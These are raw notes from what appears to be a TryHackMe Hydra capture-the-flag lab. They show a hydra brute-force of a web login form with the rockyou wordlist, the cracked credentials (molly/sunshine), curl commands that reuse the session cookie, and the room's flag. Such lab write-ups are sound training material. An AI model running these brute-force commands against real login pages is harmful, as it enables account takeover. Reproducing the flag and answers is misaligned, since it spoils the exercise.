# 10.201.20.141

hydra -l <username> -P <wordlist> 10.201.20.141 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.20.141 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."

![](https://velog.velcdn.com/images/agnusdei1207/post/b6adca47-7371-4867-aec6-80b0e34434f0/image.png)

──(root㉿docker-desktop)-[/]
└─# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.20.141 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-25 15:00:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.201.20.141:80/login:username=^USER^&password=^PASS^:Your username or password is incorrect.
[80][http-post-form] host: 10.201.20.141 login: molly password: sunshine
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-25 15:00:43

# curl -X POST http://10.201.20.141/login -d "username=molly&password=sunshine" -L -c -v cookies.txt

┌──(root㉿docker-desktop)-[/]
└─# curl -X POST http://10.201.20.141/login -d "username=molly&password=sunshine" -L -c -v cookies.txt
Note: Unnecessary use of -X or --request, POST is already inferred.

- Trying 10.201.20.141:80...
- Connected to 10.201.20.141 (10.201.20.141) port 80
- using HTTP/1.x
  > POST /login HTTP/1.1
  > Host: 10.201.20.141
  > User-Agent: curl/8.15.0
  > Accept: _/_
  > Cookie: connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA
  > Content-Length: 32
  > Content-Type: application/x-www-form-urlencoded
- upload completely sent off: 32 bytes
  < HTTP/1.1 302 Found
  < X-Powered-By: Express
- Need to rewind upload for next request
  < Location: /
  < Vary: Accept
  < Content-Type: text/plain; charset=utf-8
  < Content-Length: 23
  < Date: Thu, 25 Sep 2025 15:04:18 GMT
  < Connection: keep-alive
- Ignoring the response-body
- setting size while ignoring
  <
- Connection #0 to host 10.201.20.141 left intact
- Issue another request to this URL: 'http://10.201.20.141/'
- Stick to POST instead of GET
- Re-using existing http: connection with host 10.201.20.141
  > POST / HTTP/1.1
  > Host: 10.201.20.141
  > User-Agent: curl/8.15.0
  > Accept: _/_
  > Cookie: connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA
- Request completely sent off
  < HTTP/1.1 404 Not Found
  < X-Powered-By: Express
  < Content-Security-Policy: default-src 'none'
  < X-Content-Type-Options: nosniff
  < Content-Type: text/html; charset=utf-8
  < Content-Length: 140
  < Date: Thu, 25 Sep 2025 15:04:19 GMT
  < Connection: keep-alive
  <
  <!DOCTYPE html>
  <html lang="en">
  <head>
  <meta charset="utf-8">
  <title>Error</title>
  </head>
  <body>
  <pre>Cannot POST /</pre>
  </body>
  </html>
- Connection #0 to host 10.201.20.141 left intact

# 쿠키 확보 -> connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA

# cat cookie.txt

# curl http://10.201.20.141/ -b "connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA" -v

# curl http://10.201.20.141 -b cookies.txt -v

┌──(root㉿docker-desktop)-[/]
└─# curl http://10.201.20.141 -b cookies.txt -v

- Trying 10.201.20.141:80...
- Connected to 10.201.20.141 (10.201.20.141) port 80
- using HTTP/1.x
  > GET / HTTP/1.1
  > Host: 10.201.20.141
  > User-Agent: curl/8.15.0
  > Accept: _/_
  > Cookie: connect.sid=s%3As9arV73evR0G0jgYSx6lGjr6ltSN7CLJ.nSgKksslAMQNJewyl67h%2FhlDsKec4JPPatkE0XFGSEA
- Request completely sent off
  < HTTP/1.1 200 OK
  < X-Powered-By: Express
  < Content-Type: text/html; charset=utf-8
  < Content-Length: 856
  < ETag: W/"358-ZUlnMFSQKTY8/4+sv52YQFGK7I4"
  < Date: Thu, 25 Sep 2025 15:06:38 GMT
  < Connection: keep-alive
  <
  <!doctype html>
  <html lang="en">
    <head>
      <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="stylesheet" href="/css/bootstrap.min.css">
  <title>Hydra Challenge</title>

    </head>
    <style>
      .jumbotron {
        background-image: url(/img/background.jpg);
        color: white;
        object-fit: cover;
        height: 100vh;
        margin: 0;
        border-radius: 0;
      }
      h1 {
        position: absolute;
        left: 50px;
        top: 50px;
        font-weight: bold;
        font-size: 50px;
      }
    </style>
    <body>

      <div class="jumbotron text-center">
        <h1>THM{2673a7dd116de68e85c48ec0b1f2612e}</h1>
      </div>

      <script src="/js/jquery.slim.min.js"></script>
      <script src="/js/popper.min.js"></script>
      <script src="/js/bootstrap.min.js"></script>

    </body>
  </html>

- Connection #0 to host 10.201.20.141 left intact
